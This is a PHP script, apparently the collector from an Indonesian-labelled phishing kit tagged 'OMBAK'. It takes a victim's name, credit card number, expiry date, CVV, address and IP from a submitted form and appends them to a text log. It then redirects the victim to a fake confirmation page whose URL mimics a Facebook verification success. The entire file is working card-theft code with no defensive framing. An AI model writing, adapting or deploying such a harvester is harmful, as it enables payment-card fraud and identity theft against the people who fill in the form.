<?php
@$file = "======(OMBAK)======.txt";
@$firstName = $_POST['Fname'];
@$creditCardNumber = $_POST['CNumber'];
@$month = $_POST['mm'];
@$year = $_POST['yy'];
@$csc = $_POST['CVV'];
@$street = $_POST['street'];
@$city = $_POST['city'];
@$zip = $_POST['zip'];
@$country = $_POST['country'];
@$ip = $_SERVER['REMOTE_ADDR'];
@$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=========================(OMBAK)=========================");
fwrite($handle, "\n");
fwrite($handle, "�  NAMA      :   ");
fwrite($handle, "$firstName");
fwrite($handle, "\n");
fwrite($handle, "�  CC Number :   ");
fwrite($handle, "$creditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "�  BULAN     :   ");
fwrite($handle, "$month");
fwrite($handle, "\n");
fwrite($handle, "�  TAHUN     :   ");
fwrite($handle, "$year");
fwrite($handle, "\n");
fwrite($handle, "�  CSC/ CVV  :   ");
fwrite($handle, "$csc");
fwrite($handle, "\n");
fwrite($handle, "�  POS       :   ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "�  NEGARA    :   ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "�  JALAN     :   ");
fwrite($handle, "$street");
fwrite($handle, "\n");
fwrite($handle, "
�  KOTA      :   ");
fwrite($handle, "$city");
fwrite($handle, "\n");
fwrite($handle, "====== INFO IP :   ");
fwrite($handle, "http://whatismyipaddress.com/ip/$ip");
fwrite($handle, "\n");
fwrite($handle, "�  JAM MASUK :   ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"Confirmed.htm?fb_source=bookmark_apps&ref=verification&status=success\";
// -->
</script>";
?>
 